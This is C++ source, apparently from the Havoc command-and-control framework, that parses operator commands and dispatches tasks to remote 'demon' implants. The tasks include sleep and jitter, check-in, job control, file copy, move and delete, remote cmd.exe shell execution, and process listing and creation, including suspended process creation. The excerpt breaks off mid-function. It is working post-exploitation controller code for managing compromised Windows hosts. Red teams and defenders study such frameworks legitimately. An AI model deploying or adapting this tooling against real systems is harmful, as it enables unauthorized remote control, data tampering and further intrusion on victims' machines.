#include <global.hpp>

#include <Havoc/DemonCmdDispatch.h>
#include <UserInterface/Widgets/DemonInteracted.h>
#include <Util/ColorText.h>
#include <Havoc/Packager.hpp>

#include <sstream>
#include <vector>
#include <iomanip>
#include <filesystem>
#include <algorithm>

using namespace HavocNamespace::HavocSpace;
using namespace Util;

template<typename ... Args>
auto string_format( const std::string& format, Args ... args ) -> std::string
{
    int size_s = std::snprintf( nullptr, 0, format.c_str(), args ... ) + 1; // Extra space for '\0'
    if( size_s <= 0 ){ throw std::runtime_error( "Error during formatting." ); }
    auto size = static_cast<size_t>( size_s );
    std::unique_ptr<char[]> buf( new char[ size ] );
    std::snprintf( buf.get(), size, format.c_str(), args ... );
    return std::string( buf.get(), buf.get() + size - 1 ); // We don't want the '\0' inside
}

static bool is_number( const std::string& s )
{
    std::string::const_iterator it = s.begin();
    while ( it != s.end() && std::isdigit( *it ) ) ++it;
    return !s.empty() && it == s.end();
}

auto operator * ( string a, unsigned int b ) -> string
{
    auto output = string( "" );

    while ( b-- )
        output += a;

    return output;
}

static auto JoinAtIndex(QStringList list, int index) -> QString
{
    QString string;

    int size = list.size();
    for ( int i = 0; i < ( size - index ); i++ )
    {
        if ( i == 0 )
            string.append( list[ index + i ] );
        else
            string.append( " " + list[ index + i ] );
    }

    return string;
}

static auto JoinAtIndexPreserveQuotes(QStringList list, int index) -> QString
{
    QString string;

    int size = list.size();
    for (int i = 0; i < (size - index); ++i)
    {
        if (i == 0) string.append(list[index + i]);
        else
        {
            if (list[index + i].contains(" "))
                string.append(" \"" + list[index + i] + "\"");
            else
                string.append(" " + list[index + i]);
        }
    }

    return string;
}

auto ParseQuotes( QString commandline ) -> QStringList
{
    auto iss           = std::istringstream( commandline.toStdString() );
    auto s             = std::string();
    auto InputCommands = QStringList();

    while ( iss >> std::quoted( s ) )
        InputCommands << QString(s.c_str());

    return InputCommands;
}

// parse double quotes and backslashes
auto ParseCommandLine( QString commandline ) -> QStringList
{
    auto cmdline       = commandline.toStdString();
    auto InputCommands = QStringList();
    auto in_quotes     = false;
    char c;
    char next_c;
    char next_next_c;
    std::string parsed;

    for( size_t i = 0; i < cmdline.length(); i++)
    {
        c = cmdline[ i ];
        if ( i + 1 < cmdline.length() )
            next_c = cmdline[ i + 1 ];
        else
            next_c = 0;

        if ( i + 2 < cmdline.length() )
            next_next_c = cmdline[ i + 2 ];
        else
            next_next_c = 0;

        if ( c == '"' && ! in_quotes )
        {
            // we are entering a quoted string
            in_quotes = true;
        }
        else if ( c == '"' && in_quotes )
        {
            in_quotes = false;

            if ( next_c != ' ' )
            {
                // we got out of quotes and the next char is not a space, break word
                InputCommands << QString(parsed.c_str());
                parsed = "";
            }
        }
        // handle a backslash
        else if ( c == '\\' )
        {
            if ( next_c == '\\' )
            {
                /*
                 * double backslask is a special scenario:
                 * we want to allow: \\dc01\c$\windows, instead of: \\\\dc01\c$\windows
                 * but also, we want to be able to escape backslashes
                 * if they are followed by a space or double quote
                 * meaning:
                 * double backslash followed by a space or double quote = escaped backslash
                 * double backslash followed by any other character     = double backslash
                 */
                if ( next_next_c == ' ' || next_next_c == '"' )
                {
                    // we are in these scenarios:
                    // "foo 1\\" bar -> arg1: 'foo 1\' arg2: 'bar'
                    // foo\\ bar     -> arg1: 'foo\' arg2: 'bar'
                    parsed += '\\';
                    i++;
                }
                else
                {
                    // we are in this scenario:
                    // \\dc01\c$\windows -> \\dc01\c$\windows
                    parsed += '\\';
                }
            }
            // if the next char is a space, enter it
            else if ( next_c == ' ' )
            {
                parsed += ' ';
                i++;
            }
            // if the next char is a double quote, enter it
            else if ( next_c == '"' )
            {
                parsed += '"';
                i++;
            }
            else
            {
                // if the next char some other value, enter a backslash
                parsed += '\\';
            }
        }
        else if ( c == ' ' && ! in_quotes )
        {
            // we have a space while not in quotes, break word
            InputCommands << QString(parsed.c_str());
            parsed = "";
        }
        else
        {
            // If we encounter any other character, add it to the parsed string
            parsed += c;
        }
    }

    // add the end of the last string
    if ( parsed.size() > 0 )
    {
        InputCommands << QString(parsed.c_str());
        parsed = "";
    }

    return InputCommands;
}

bool compareQString(const QString &a, const QString &b)
{
    return a.toLower() < b.toLower();
}

DemonCommands::DemonCommands( )
{
    Execute.DemonCommandInstance = this;
}

auto DemonCommands::SetDemonConsole( UserInterface::Widgets::DemonInteracted* pInteracted ) -> void
{
    this->DemonConsole = pInteracted;
}

auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& commandline ) -> bool
{
    auto InputCommands = ParseCommandLine(commandline);
    auto IsDemonAgent  = false;
    auto AgentData     = ServiceAgent();

    // check if it's a generic demon or 3rd party agent

    if ( MagicValue == DemonMagicValue )
    {
        IsDemonAgent = true;
    }
    else
    {
        for ( auto& agent : HavocX::Teamserver.ServiceAgents )
        {
            if ( MagicValue == agent.MagicValue )
            {
                AgentData = agent;
                AgentTypeName = agent.Name;
            }
        }
    }

    if ( IsDemonAgent )
    {
        if ( InputCommands[ 0 ].compare( "help" ) == 0 )
        {
            if ( InputCommands.size() > 1 && InputCommands[ 1 ] != "" )
            {
                bool FoundCommand = false;
                for ( auto & commandIndex : DemonCommandList )
                {
                    if ( InputCommands[ 1 ].compare( commandIndex.CommandString ) == 0 )
                    {
                        FoundCommand = true;
                        if ( ( ! commandIndex.SubCommands.empty() || commandIndex.Module ) && InputCommands.size() > 2 && InputCommands[ 2 ] != "" )
                        {
                            bool FoundSubCommand = false;

                            for ( auto & SubCommand : commandIndex.SubCommands )
                            {
                                auto SubCommandString = SubCommand.CommandString;

                                if ( InputCommands[ 2 ].compare( SubCommandString ) == 0 )
                                {
                                    FoundSubCommand = true;

                                    DemonConsole->Console->append( "" );
                                    DemonConsole->Console->append( " - Module        :  " + commandIndex.CommandString );
                                    DemonConsole->Console->append( " - Sub Command   :  " + SubCommand.CommandString );
                                    DemonConsole->Console->append( " - Description   :  " + SubCommand.Description );

                                    if ( ! SubCommand.Behavior.isEmpty() )
                                        DemonConsole->Console->append( " - Behavior      :  " + SubCommand.Behavior );

                                    if ( ! SubCommand.Usage.isEmpty() )
                                        DemonConsole->Console->append( " - Usage         :  " + commandIndex.CommandString + " "+ SubCommand.CommandString + " " + SubCommand.Usage );

                                    if ( ! SubCommand.Example.isEmpty() )
                                        DemonConsole->Console->append( " - Example       :  " + commandIndex.CommandString + " "+ SubCommand.CommandString + " " + SubCommand.Example );
                                    /*
                                    if ( ! SubCommand.Usage.isEmpty() )
                                        DemonConsole->Console->append( " - Required Args :  " + QString( to_string( SubCommand.Usage.split( " " ).size() ).c_str() ) );*/

                                    if ( ! SubCommand.Options.isEmpty() )
                                    {
                                        DemonConsole->Console->append( " - Options       :  " );
                                        for ( auto& Option : SubCommand.Options )
                                            DemonConsole->Console->append( "      " + Option);
                                    }

                                    break;
                                }
                            }

                            if ( ! FoundSubCommand )
                            {
                                for ( auto& Command : HavocX::Teamserver.RegisteredCommands )
                                {
                                    if ( InputCommands[ 1 ].compare( Command.Module.c_str() ) == 0 )
                                    {
                                        if ( InputCommands[ 2 ].compare( Command.Command.c_str() ) == 0 )
                                        {
                                            FoundSubCommand = true;

                                            DemonConsole->Console->append( "" );
                                            DemonConsole->Console->append( " - Module        :  " + QString( Command.Module.c_str() ) );
                                            DemonConsole->Console->append( " - Sub Command   :  " + QString( Command.Command.c_str() ) );
                                            DemonConsole->Console->append( " - Description   :  " + QString( Command.Help.c_str() ) );

                                            // if ( Command.Behavior != 0 )
                                            //     DemonConsole->Console->append( " - Behavior      :  " + SubCommand.Behavior );

                                            if ( Command.Usage.c_str() )
                                                DemonConsole->Console->append( " - Usage         :  " + QString( Command.Module.c_str() ) + " " + QString( Command.Command.c_str() ) + " " + QString( Command.Usage.c_str() ) );

                                            if ( Command.Example.c_str() )
                                                DemonConsole->Console->append( " - Example       :  " + QString( Command.Module.c_str() ) + " " + QString( Command.Command.c_str() ) + " " + QString( Command.Example.c_str() ) );

                                            /*if ( ! QString( Command.Usage.c_str() ).isEmpty() )
                                                DemonConsole->Console->append( " - Required Args :  " + QString( to_string( SubCommand.Usage.split( " " ).size() ).c_str() ) );*/
                                        }
                                    }
                                }

                                if ( ! FoundSubCommand )
                                {
                                    DemonConsole->Console->append( Util::ColorText::Red( "[-]" ) + " Couldn't find sub command in \"" + InputCommands[ 1 ] + "\": " + InputCommands[ 2 ] );
                                }
                            }

                        }
                        else
                        {
                            DemonConsole->Console->append( "" );
                            DemonConsole->Console->append( " - Command       :  " + commandIndex.CommandString );
                            DemonConsole->Console->append( " - Description   :  " + commandIndex.Description );

                            if ( ! commandIndex.Behavior.isEmpty() )
                                DemonConsole->Console->append( " - Behavior      :  " + commandIndex.Behavior );

                            if ( ! commandIndex.Usage.isEmpty() )
                                DemonConsole->Console->append( " - Usage         :  " + commandIndex.CommandString + " " + commandIndex.Usage );

                            if ( ! commandIndex.Example.isEmpty() )
                                DemonConsole->Console->append( " - Example       :  " + commandIndex.CommandString + " " + commandIndex.Example );

                            if ( ! commandIndex.Usage.isEmpty() && commandIndex.SubCommands.empty() )
                                DemonConsole->Console->append(" - Required Args :  " + QString(to_string(commandIndex.Usage.split(" ").size()).c_str()));

                            if ( ! commandIndex.SubCommands.empty() || commandIndex.Module )
                            {
                                DemonConsole->Console->append( "" );
                                DemonConsole->Console->append( "  Command                        Description      " );
                                DemonConsole->Console->append( "  ---------                      -------------     " );


                                /*if ( commandIndex.SubCommands.empty() )
                                {
                                    DemonConsole->TaskError( "No subcommand registered for " + commandIndex.CommandString );
                                    return false;
                                }*/

                                for ( auto & SubCommand : commandIndex.SubCommands )
                                {
                                    if ( SubCommand.CommandString != nullptr )
                                    {
                                        int TotalSize   = 31;
                                        int CmdSize     = SubCommand.CommandString.size();

                                        if ( CmdSize > 31 )
                                            CmdSize = 31;

                                        std::string Spaces      = std::string( ( TotalSize - CmdSize ), ' ' );

                                        DemonConsole->Console->append( "  " + SubCommand.CommandString + QString( Spaces.c_str() ) + SubCommand.Description );
                                    }
                                }

                                for ( auto& Command : HavocX::Teamserver.RegisteredCommands )
                                {
                                    if ( InputCommands[ 1 ].compare( Command.Module.c_str() ) == 0 )
                                    {
                                        int         TotalSize   = 19;
                                        std::string Spaces      = std::string( ( TotalSize - Command.Command.size() ), ' ' );

                                        DemonConsole->Console->append( "  " + QString( Command.Command.c_str() ) + QString( Spaces.c_str() ) + "       " + QString( Command.Help.c_str() ) );
                                    }
                                }
                            }
                        }

                        break;
                    }
                }

                if ( ! FoundCommand )
                {
                    spdlog::debug( "check registered modules" );
                    // Alright first check if we registered a module
                    for ( auto& Module : HavocX::Teamserver.RegisteredModules )
                    {
                        spdlog::debug( " - {}", Module.Name );
                        if ( InputCommands[ 1 ].compare( Module.Name.c_str() ) == 0 )
                        {
                            FoundCommand = true;

                            if ( InputCommands.size() > 2 )
                            {
                                for ( auto& Command : HavocX::Teamserver.RegisteredCommands )
                                {
                                    if ( InputCommands[ 1 ].compare( Command.Module.c_str() ) == 0 && InputCommands[ 2 ].compare( Command.Command.c_str() ) == 0 )
                                    {
                                        DemonConsole->Console->append( "" );
                                        DemonConsole->Console->append( " - Command       :  " + QString( Module.Name.c_str() ) + QString( " " ) + QString( Command.Command.c_str() ) );
                                        DemonConsole->Console->append( " - Description   :  " + QString( Command.Help.c_str() ) );

                                        if ( ! Module.Usage.empty() )
                                            DemonConsole->Console->append( " - Usage         :  " + QString( Module.Name.c_str() ) + QString( " " ) + QString( Command.Command.c_str() ) + " " + QString( Command.Usage.c_str() )  );

                                        if ( ! Command.Example.empty() )
                                            DemonConsole->Console->append( " - Example       :  " + QString( Module.Name.c_str() ) + QString( " " ) + QString( Command.Command.c_str() ) + " " + QString( Command.Example.c_str() ) );

                                        if ( ! Command.Usage.empty() )
                                            DemonConsole->Console->append(" - Required Args :  " + QString( to_string( QString( Command.Usage.c_str() ).split(" ").size() ).c_str() ) );

                                        break;
                                    }
                                }
                            }
                            else
                            {
                                DemonConsole->Console->append( "" );
                                DemonConsole->Console->append( " - Command       :  " + QString( Module.Name.c_str() ) );
                                DemonConsole->Console->append( " - Description   :  " + QString( Module.Description.c_str() ) );

                                if ( ! Module.Behavior.empty() )
                                    DemonConsole->Console->append( " - Behavior      :  " + QString( Module.Behavior.c_str() ) );

                                if ( ! Module.Usage.empty() )
                                    DemonConsole->Console->append( " - Usage         :  " + QString( Module.Name.c_str() ) + " " + QString( Module.Usage.c_str() )  );

                                if ( ! Module.Example.empty() )
                                    DemonConsole->Console->append( " - Example       :  " + QString( Module.Name.c_str() ) + " " + QString( Module.Example.c_str() ) );

                                if ( ! Module.Usage.empty() )
                                    DemonConsole->Console->append(" - Required Args :  " + QString( to_string( QString( Module.Usage.c_str() ).split(" ").size() ).c_str() ) );

                                DemonConsole->Console->append( "" );
                                DemonConsole->Console->append( "  Command                   Description      " );
                                DemonConsole->Console->append( "  ---------                 -------------     " );

                                for ( auto& Command : HavocX::Teamserver.RegisteredCommands )
                                {
                                    if ( InputCommands[ 1 ].compare( Command.Module.c_str() ) == 0 )
                                    {
                                        int         TotalSize   = 19;
                                        std::string Spaces      = std::string( ( TotalSize - Command.Command.size() ), ' ' );

                                        DemonConsole->Console->append( "  " + QString( Command.Command.c_str() ) + QString( Spaces.c_str() ) + "       " + QString( Command.Help.c_str() ) );
                                    }
                                }
                            }
                        }
                    }

                    // Alright... we still can't find what we are searching for so lets search for registered commands...
                    if ( ! FoundCommand )
                    {
                        for ( auto& Command : HavocX::Teamserver.RegisteredCommands )
                        {
                            if ( InputCommands[ 1 ].compare( Command.Command.c_str() ) == 0 && Command.Module.length() == 0 )
                            {
                                FoundCommand = true;

                                DemonConsole->Console->append( "" );
                                DemonConsole->Console->append( " - Command       :  " + QString( Command.Command.c_str() ) );
                                DemonConsole->Console->append( " - Description   :  " + QString( Command.Help.c_str() ) );

                                if ( Command.Usage.c_str() )
                                    DemonConsole->Console->append( " - Usage         : " + QString( Command.Module.c_str() ) + " " + QString( Command.Command.c_str() ) + " " + QString( Command.Usage.c_str() ) );

                                if ( Command.Example.c_str() )
                                    DemonConsole->Console->append( " - Example       : " + QString( Command.Module.c_str() ) + " " + QString( Command.Command.c_str() ) + " " + QString( Command.Example.c_str() ) );

                            }
                        }
                    }

                    // Ok we have no clue what you mean lol.
                    if ( ! FoundCommand )
                        DemonConsole->Console->append( Util::ColorText::Red( "[-]" ) + " Couldn't find command: " + InputCommands[ 1 ] );
                }
            }
            else
            {
                int TotalSize = 25;

                std::vector<QString> commandOutput;

                for (auto &i : DemonCommandList)
                {
                    QString currentLine;

                    if (!i.SubCommands.empty() || i.Module)
                    {
                        if (i.Module)
                        {
                            currentLine = "  " + i.CommandString + QString(std::string((TotalSize - i.CommandString.size()), ' ').c_str()) + "Module " + "      " + i.Description;
                        }
                        else if (i.SubCommands.empty())
                        {
                            if (i.SubCommands[0].CommandString != nullptr)
                            {
                                currentLine = "  " + i.CommandString + QString(std::string((TotalSize - i.CommandString.size()), ' ').c_str()) + "Module " + "      " + i.Description;
                            }
                        }
                        else
                        {
                            currentLine = "  " + i.CommandString + QString(std::string((TotalSize - i.CommandString.size()), ' ').c_str()) + "Command" + "      " + i.Description;
                        }
                    }
                    else
                    {
                        currentLine = "  " + i.CommandString + QString(std::string((TotalSize - i.CommandString.size()), ' ').c_str()) + "Command" + "      " + i.Description;
                    }

                    commandOutput.push_back(currentLine);
                }

                for (auto &Module : HavocX::Teamserver.RegisteredModules)
                {
                    if (!Module.Name.empty())
                    {
                        QString currentLine = "  " + QString(Module.Name.c_str()) + QString(std::string((TotalSize - Module.Name.size()), ' ').c_str()) + "Module " + "      " + QString(Module.Description.c_str());
                        commandOutput.push_back(currentLine);
                    }
                }

                for (auto &Command : HavocX::Teamserver.RegisteredCommands)
                {
                    if (Command.Module.empty())
                    {
                        QString currentLine = "  " + QString(Command.Command.c_str()) + QString(std::string((TotalSize - Command.Command.size()), ' ').c_str()) + "Command" + "      " + QString(Command.Help.c_str());
                        commandOutput.push_back(currentLine);
                    }
                }

                // Sort the commandOutput vector alphabetically
                std::sort(commandOutput.begin(), commandOutput.end(), compareQString);

                // Append the sorted commands to the console
                DemonConsole->Console->append("");
                DemonConsole->Console->append("Demon Commands");
                DemonConsole->Console->append("==============");
                DemonConsole->Console->append("");
                DemonConsole->Console->append("  Command                  Type         Description");
                DemonConsole->Console->append("  -------                  -------      -----------");

                for (const auto &output : commandOutput)
                {
                    DemonConsole->Console->append(output);
                }
            }

            return true;
        }
        else if ( InputCommands[ 0 ].compare( "sleep" ) == 0 )
        {
            if ( InputCommands.size() < 2 ) {
                CONSOLE_ERROR( "Not enough arguments" );
                return false;
            }

            if ( InputCommands.size() > 3 ) {
                CONSOLE_ERROR( "Too many arguments" );
                return false;
            }

            if ( InputCommands[ 1 ].at( 0 ) == '-' )
            {
                CONSOLE_ERROR( "\"sleep\" doesn't support negative delays" );
                return false;
            }

            auto jit = QString( "0" );
            if ( InputCommands.size() == 3 )
            {
                jit = InputCommands[ 2 ];
                bool ok;
                double jitter = jit.toDouble(&ok);
                if ( ok == false )
                {
                    CONSOLE_ERROR( "Invalid jitter" );
                    return false;
                }
                if ( jitter < 0 )
                {
                    CONSOLE_ERROR( "\"sleep\" doesn't support negative jitters" );
                    return false;
                }
                if ( jitter > 100 )
                {
                    CONSOLE_ERROR( "The jitter can't be larger than 100" );
                    return false;
                }
                TaskID = CONSOLE_INFO( "Tasked demon to sleep for " + InputCommands[ 1 ] + " seconds with " + jit + "% jitter" );
            }
            else
            {
                TaskID = CONSOLE_INFO( "Tasked demon to sleep for " + InputCommands[ 1 ] + " seconds" );

            }

            CommandInputList[ TaskID ] = commandline;
            SEND( Execute.Sleep( TaskID, InputCommands[ 1 ] + ";" + jit ) )
        }
        else if ( InputCommands[ 0 ].compare( "interactive" ) == 0 )
        {
            if ( InputCommands.size() > 1 ) {
                CONSOLE_ERROR( "Too many arguments" );
                return false;
            }

            TaskID = CONSOLE_INFO( "Tasked demon to enter interactive mode" );
            CommandInputList[ TaskID ] = commandline;
            SEND( Execute.Sleep( TaskID, "0;0" ) )
        }
        else if ( InputCommands[ 0 ].compare( "checkin" ) == 0 )
        {
            TaskID = CONSOLE_INFO( "Tasked demon send back a checkin request" );
            CommandInputList[ TaskID ] = commandline;
            SEND( Execute.Checkin( TaskID ) )
        }
        else if ( InputCommands[ 0 ].compare( "task" ) == 0 )
        {
            if ( InputCommands.size() == 1 )
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }

            if ( InputCommands[ 1 ].compare( "list" ) == 0 )
            {
                TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked teamserver to list commands in task queue" );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Task( TaskID, "task::list" ) );
            }
            else if ( InputCommands[ 1 ].compare( "clear" ) == 0 )
            {
                TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked teamserver to clear all commands from task queue" );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Task( TaskID, "task::clear" ) );
            }
            else
            {
                CONSOLE_ERROR( "Sub command '" + InputCommands[ 1 ]+ "' in 'task' not found found" )
                return false;
            }
        }
        else if ( InputCommands[ 0 ].compare( "job" ) == 0 )
        {
            if ( InputCommands.size() == 1 )
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }

            if ( InputCommands[ 1 ].compare( "list" ) == 0 )
            {
                TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to list jobs" );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Job( TaskID, "list", "0" ) )
            }
            else if ( InputCommands[ 1 ].compare( "suspend" ) == 0 )
            {
                if ( InputCommands.length() >= 3 )
                {
                    TaskID = CONSOLE_INFO( "Tasked demon to suspend job: " + InputCommands[ 2 ] );
                    CommandInputList[ TaskID ] = commandline;

                    SEND( Execute.Job( TaskID, "suspend", InputCommands[ 2 ] ) )
                }
                else
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                }
            }
            else if ( InputCommands[ 1 ].compare( "resume" ) == 0 )
            {
                if ( InputCommands.length() >= 3 )
                {
                    TaskID = CONSOLE_INFO( "Tasked demon to resume job: " + InputCommands[ 2 ] );
                    CommandInputList[ TaskID ] = commandline;

                    SEND( Execute.Job( TaskID, "resume", InputCommands[ 2 ] ) )
                }
                else
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                }
            }
            else if ( InputCommands[ 1 ].compare( "kill" ) == 0 )
            {
                if ( InputCommands.length() >= 3 )
                {
                    TaskID = CONSOLE_INFO( "Tasked demon to kill job: " + InputCommands[ 2 ] );
                    CommandInputList[ TaskID ] = commandline;

                    SEND( Execute.Job( TaskID, "kill", InputCommands[ 2 ] ) )
                }
                else
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                }
            }
            else
            {
                CONSOLE_ERROR( "Sub command not found: " + InputCommands[ 1 ] )
            }
        }
        else if ( InputCommands[ 0 ].compare( "dir" ) == 0 || InputCommands[ 0 ].compare( "ls" ) == 0 )
        {
            auto Path      = QString( "" );
            auto SubDirs   = "false";
            auto FilesOnly = "false";
            auto DirsOnly  = "false";
            auto ListOnly  = "false";
            auto Starts    = QString( "" );
            auto Contains  = QString( "" );
            auto Ends      = QString( "" );

            if ( InputCommands.size() == 1 )
            {
                Path = ".";
                TaskID = CONSOLE_INFO( "Tasked demon to list current directory" );
            }
            else
            {
                Path = InputCommands[ 1 ];
                for ( int i = 2; i < InputCommands.size(); ++i )
                {
                    if ( InputCommands[ i ].compare( "/s" ) == 0 )
                    {
                        SubDirs = "true";
                    }
                    else if ( InputCommands[ i ].compare( "/f" ) == 0 )
                    {
                        FilesOnly = "true";
                    }
                    else if ( InputCommands[ i ].compare( "/d" ) == 0 )
                    {
                        DirsOnly = "true";
                    }
                    else if ( InputCommands[ i ].compare( "/b" ) == 0 )
                    {
                        ListOnly = "true";
                    }
                    else if ( InputCommands[ i ].compare( "/starts" ) == 0 )
                    {
                        if ( i + 1 == InputCommands.size() )
                        {
                            CONSOLE_ERROR( "Not enough arguments" );
                            return false;
                        }

                        Starts = InputCommands[ i + 1 ];
                        i++;
                    }
                    else if ( InputCommands[ i ].compare( "/contains" ) == 0 )
                    {
                        if ( i + 1 == InputCommands.size() )
                        {
                            CONSOLE_ERROR( "Not enough arguments" );
                            return false;
                        }

                        Contains = InputCommands[ i + 1 ];
                        i++;
                    }
                    else if ( InputCommands[ i ].compare( "/ends" ) == 0 )
                    {
                        if ( i + 1 == InputCommands.size() )
                        {
                            CONSOLE_ERROR( "Not enough arguments" );
                            return false;
                        }

                        Ends = InputCommands[ i + 1 ];
                        i++;
                    }
                    else
                    {
                        CONSOLE_ERROR( "Unknown parameter " + InputCommands[ i ] );
                        return false;
                    }
                }

                if ( FilesOnly == "true" && DirsOnly == "true" )
                {
                    CONSOLE_ERROR( "Cannot set both /f and /d" );
                    return false;
                }

                TaskID = CONSOLE_INFO( "Tasked demon to list " + Path );
            }

            CommandInputList[ TaskID ] = commandline;
            SEND( Execute.FS( TaskID, "dir", Path + ";" + SubDirs + ";" + FilesOnly + ";" + DirsOnly + ";" + ListOnly + ";" + Starts + ";" + Contains + ";" + Ends ) );
        }
        else if (InputCommands[0].compare( "cd" ) == 0)
        {
            if ( InputCommands.size() < 2 )
            {
                CONSOLE_ERROR( "Not enough arguments" );
                return false;
            }

            auto Path = JoinAtIndex( InputCommands, 1 );
            TaskID = CONSOLE_INFO( "Tasked demon to change directory: " + Path );

            CommandInputList[ TaskID ] = commandline;
            SEND( Execute.FS( TaskID, "cd", Path ) );
        }
        else if ( InputCommands[ 0 ].compare( "cp" ) == 0)
        {
            if ( InputCommands.size() < 3 )
            {
                CONSOLE_ERROR( "Not enough arguments" );
                return false;
            }

            auto PathFrom = InputCommands[ 1 ];
            auto PathTo   = JoinAtIndex( InputCommands, 2 );

            TaskID = CONSOLE_INFO( "Tasked demon to copy file " + PathFrom + " to " + PathTo );

            CommandInputList[ TaskID ] = commandline;
            SEND( Execute.FS( TaskID, "cp", PathFrom.toLocal8Bit().toBase64() + ";" + PathTo.toLocal8Bit().toBase64() ) );
        }
        else if ( InputCommands[ 0 ].compare( "mv" ) == 0 || InputCommands[ 0 ].compare( "move" ) == 0 )
        {
            if ( InputCommands.size() < 3 )
            {
                CONSOLE_ERROR( "Not enough arguments" );
                return false;
            }

            auto PathFrom = InputCommands[ 1 ];
            auto PathTo   = JoinAtIndex( InputCommands, 2 );

            TaskID = CONSOLE_INFO( "Tasked demon to move file " + PathFrom + " to " + PathTo );

            CommandInputList[ TaskID ] = commandline;
            SEND( Execute.FS( TaskID, "mv", PathFrom.toLocal8Bit().toBase64() + ";" + PathTo.toLocal8Bit().toBase64() ) );
        }
        else if ( InputCommands[ 0 ].compare( "remove" ) == 0 )
        {
            if ( InputCommands.size() < 2 )
            {
                CONSOLE_ERROR( "Not enough arguments" );
                return false;
            }

            auto Path = JoinAtIndex( InputCommands, 1 );
            TaskID = CONSOLE_INFO( "Tasked demon to remove file or directory: " + Path );

            CommandInputList[ TaskID ] = commandline;
            SEND( Execute.FS( TaskID, "remove", Path ) );
        }
        else if (InputCommands[0].compare( "mkdir" ) == 0)
        {
            auto Path = JoinAtIndex( InputCommands, 1 );
            TaskID = CONSOLE_INFO( "Tasked demon to create new directory: " + Path );

            if ( InputCommands.size() < 1 )
            {
                CONSOLE_ERROR( "Not enough arguments" );
                return false;
            }

            CommandInputList[ TaskID ] = commandline;
            SEND( Execute.FS( TaskID, "mkdir", Path ) );
        }
        else if ( InputCommands[0].compare( "pwd" ) == 0)
        {
            TaskID = CONSOLE_INFO( "Tasked demon to get current working directory" );
            CommandInputList[ TaskID ] = commandline;
            SEND( Execute.FS( TaskID, "pwd", "" ) );
        }
        else if ( InputCommands[ 0 ].compare( "shell" ) == 0 )
        {
            if ( InputCommands.length() > 1 )
            {
                auto Program = QString("c:\\windows\\system32\\cmd.exe");
                // NOTE: the 'shell' command does not need to escape quotes
                auto Args = QString( "/c " + JoinAtIndex( commandline.split( " " ), 1 ) ).toUtf8().toBase64();

                TaskID = CONSOLE_INFO( "Tasked demon to execute a shell command" );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.ProcModule( TaskID, 4, "0;FALSE;TRUE;" + Program + ";" + Args ) )
            }
            else
            {
                DemonConsole->Console->append( "" );
                DemonConsole->Console->append( Prompt );
                DemonConsole->TaskError( "Not enough arguments" );
            }
        }
        else if ( InputCommands[ 0 ].compare( "proc" ) == 0 )
        {
            if ( InputCommands.size() == 1 )
            {
                DemonConsole->Console->append( "" );
                DemonConsole->Console->append( Prompt );
                DemonConsole->TaskError( "Not enough arguments" );
                return false;
            }
            if ( InputCommands[ 1 ].compare( "list" ) == 0 )
            {
                TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to enumerate and list all processes" );
                CommandInputList[ TaskID ] = commandline;
                if ( Send ) Execute.ProcList( TaskID, false );

            }
            else if ( InputCommands[ 1 ].compare( "modules" ) == 0 )
            {
                if ( InputCommands.length() >= 3 )
                {
                    TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to list all modules/dll of a remote process" );
                    CommandInputList[ TaskID ] = commandline;

                    if ( Send )
                        Execute.ProcModule( TaskID, 2, InputCommands[ 2 ] );
                }
                else
                {
                    DemonConsole->Console->append( "" );
                    DemonConsole->Console->append( Prompt );
                    DemonConsole->TaskError( "Not enough arguments" );
                }
            }

            else if ( InputCommands[ 1 ].compare( "grep" ) == 0 )
            {
                if ( InputCommands.length() >= 3 )
                {
                    TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to grep information about the specified process" );
                    CommandInputList[TaskID] = commandline;

                    if ( Send )
                        Execute.ProcModule( TaskID, 3, InputCommands[ 2 ] );
                }
                else
                {
                    DemonConsole->Console->append( "" );
                    DemonConsole->Console->append( Prompt );
                    DemonConsole->TaskError( "Not enough arguments" );
                }
            }

            else if ( InputCommands[ 1 ].compare( "create" ) == 0 )
            {
                if ( InputCommands.length() >= 4 )
                {
                    auto Index   = 2;
                    auto Flags   = QString();
                    auto Program = QString();
                    auto Args    = QString();
                    auto Verbose = QString();
                    auto Piped   = QString();

                    if ( InputCommands[ Index ].compare( "normal" ) == 0 )
                    {
                        Flags = "0";
                    }
                    else if ( InputCommands[ Index ].compare( "suspended" ) == 0 )
                    {
                        // CREATE_SUSPENDED = 0x00000004
                        Flags = "4";
                    }
                    else
                    {
                        CONSOLE_ERROR( "Process creation flag not found: " + InputCommands[ Index ] )
                        return false;
                    }

                    Index++;

                    Verbose = "TRUE";
                    if ( InputCommands[ Index ].compare( "--silent" ) == 0 )
                    {
                        Verbose = "FALSE";
                        Index++;
                    }


                    Piped = "TRUE";
                    if ( InputCommands[ Index ].compare( "--no-pipe" ) == 0 )
                    {
                        Piped = "FALSE";
                        Index++;
                    }

                    Program = InputCommands[ Index ];

                    Index++;

                    Args = "\"" + Program + "\"";
                    for (int i = Index; i < InputCommands.length(); ++i)
                    {
                        Args += " " + InputCommands[ i ];
                    }

                    if ( Flags.compare( "4" ) == 0 )
                    {
                        TaskID = CONSOLE_INFO( "Tasked demon to spawn a process in suspended state: " + Program );
                    }
                    else
                    {
                        TaskID = CONSOLE_INFO( "Tasked demon to spawn a process: " + Program );
                    }

                    Args = Args.toUtf8().toBase64();

                    CommandInputList[ TaskID ] = commandline;

                    SEND( Execute.ProcModule( TaskID, 4, Flags + ";" + Verbose + ";" + Piped + ";" + Program + ";" + Args ) )
                }
                else
                {
                    DemonConsole->Console->append( "" );
                    DemonConsole->Console->append( Prompt );
                    DemonConsole->TaskError( "Not enough arguments" );
                }
            }
            else if ( InputCommands[ 1 ].compare( "blockdll" ) == 0 )
            {
                if ( InputCommands.length() >= 3 )
                {
